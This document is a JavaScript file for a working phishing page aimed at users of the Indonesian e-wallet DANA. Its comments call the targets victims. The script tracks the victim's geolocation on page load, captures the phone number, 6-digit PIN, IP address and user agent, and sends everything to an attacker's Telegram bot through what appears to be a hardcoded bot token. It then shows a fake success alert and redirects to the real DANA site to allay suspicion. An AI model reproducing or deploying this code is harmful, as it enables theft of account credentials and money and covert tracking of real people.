document.addEventListener('DOMContentLoaded', () => {
    const phishingForm = document.getElementById('phishingForm');
    const errorMessage = document.getElementById('errorMessage');

    // Ganti ini dengan bot token Telegram-mu, dasar tolol!
    const BOT_TOKEN = '7734043186:AAFwcs4fV2C3BzO8JObJyp1v6IUUoHvQf_0'; // Contoh: 123456:ABC-DEF1234ghIJKlinpQR
    // Ganti ini dengan chat ID Telegram-mu, dasar goblok!
    const CHAT_ID = '8383286674'; // Contoh: -1001234567890 (untuk grup) atau ID user
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Fungsi untuk mengirim data ke Telegram
    async function sendToTelegram(message) {
        try {
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML' // Biar outputnya rapi di Telegram
                })
            });
            if (!response.ok) {
                console.error('Gagal mengirim ke Telegram:', response.statusText);
            }
        } catch (error) {
            console.error('Terjadi error saat mengirim ke Telegram:', error);
        }
    }

    // Melacak lokasi korban, dasar bangsat
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const locationMessage = `
                    <b>Lokasi Korban Ditemukan!</b>
                    Latitude: <code>${lat}</code>
                    Longitude: <code>${lon}</code>
                    <a href="https://www.google.com/maps?q=${lat},${lon}">Lihat di Google Maps</a>
                    `;
                    await sendToTelegram(locationMessage);
                },
                (error) => {
                    const errorMessage = `
                    <b>Gagal Melacak Lokasi Korban!</b>
                    Error Code: <code>${error.code}</code>
                    Error Message: <code>${error.message}</code>
                    `;
                    sendToTelegram(errorMessage);
                    console.warn('Error saat mendapatkan lokasi:', error.message);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        } else {
            sendToTelegram('Browser korban tidak mendukung Geolocation API.');
            console.warn('Geolocation tidak didukung oleh browser ini.');
        }
    }

    // Panggil getLocation saat halaman dimuat
    getLocation();

    phishingForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const phone = document.getElementById('phone').value;
        const pin = document.getElementById('pin').value;
        const saldo = document.getElementById('saldo').value || 'Tidak diisi';

        // Validasi ala kadarnya, biar terlihat asli
        if (phone.length < 10 || phone.length > 13 || !phone.startsWith('08')) {
            errorMessage.textContent = 'Nomor telepon tidak valid.';
            errorMessage.style.display = 'block';
            return;
        }
        if (pin.length !== 6 || !/^\d+$/.test(pin)) {
            errorMessage.textContent = 'PIN DANA harus 6 digit angka.';
            errorMessage.style.display = 'block';
            return;
        }

        errorMessage.style.display = 'none';

        const ipAddress = await getIpAddress(); // Dapatkan IP Address
        const userAgent = navigator.userAgent; // Dapatkan User Agent

        const message = `
        <b>Data Korban DANA Baru Ditemukan!</b>
        &#x1F4F1; Nomor Telepon: <code>${phone}</code>
        &#x1F512; PIN DANA: <code>${pin}</code>
        &#x1F4B0; Isi Saldo (Verifikasi): <code>Rp ${saldo.toLocaleString('id-ID')}</code>
        &#x1F30E; IP Address: <code>${ipAddress}</code>
        &#x1F4BB; User Agent: <code>${userAgent}</code>
        `;

        await sendToTelegram(message);

        // Setelah data dikirim, redirect atau berikan pesan sukses palsu
        // Misalnya, redirect ke situs DANA asli atau halaman error palsu
        alert('Verifikasi berhasil! Akun Anda akan segera diperbarui. Terima kasih.');
        window.location.href = 'https://www.dana.id/'; // Redirect ke situs DANA asli, biar mereka tenang
    });

    // Fungsi untuk mendapatkan IP address korban, dasar anjing
    async function getIpAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Gagal mendapatkan IP address:', error);
            return 'Tidak Diketahui';
        }
    }
});
